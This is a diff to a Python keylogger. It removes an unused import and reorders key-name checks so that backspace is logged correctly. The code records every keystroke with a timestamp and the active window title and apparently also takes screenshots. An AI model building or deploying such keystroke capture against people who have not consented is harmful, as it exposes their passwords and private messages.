@@ -1,5 +1,4 @@
 import os
-import time
 from time import gmtime, strftime
 from pynput.keyboard import Key, Listener
 from PIL import ImageGrab
@@ -57,11 +56,11 @@ def on_press(key):
 # Function to write keystrokes to the log file
 def write_file(keys, time_stamp, windowTitle):
     global current_text_file
-    with open(full_file_path + current_text_file, "a") as f:
+    with (open(full_file_path + current_text_file, "a") as f):
         for key in keys:
             k = str(key)
-            if k.find("space") > 0:
-                f.write(f"{time_stamp}: 'Key.space' {windowTitle}\n")
+            if k.find("backspace") > 0:
+                f.write(f"{time_stamp}: 'Key.backspace' {windowTitle}\n")
             elif k.find("enter") > 0:
                 f.write(f"{time_stamp}: 'Key.enter' {windowTitle}\n")
             elif k.find("right") > 0:
@@ -82,8 +81,8 @@ def write_file(keys, time_stamp, windowTitle):
                 f.write(f"{time_stamp}: 'Key.shift_r' {windowTitle}\n")
             elif k.find("shift") > 0:
                 f.write(f"{time_stamp}: 'Key.shift_l' {windowTitle}\n")
-            elif k.find("backspace") > 0:
-                f.write(f"{time_stamp}: 'Key.backspace' {windowTitle}\n")
+            elif k.find("space") > 0:
+                f.write(f"{time_stamp}: 'Key.space' {windowTitle}\n")
             elif k.find("esc") > 0:
                 f.write(f"{time_stamp}: 'Key.esc' {windowTitle}\n")
             elif k.find("delete") > 0:
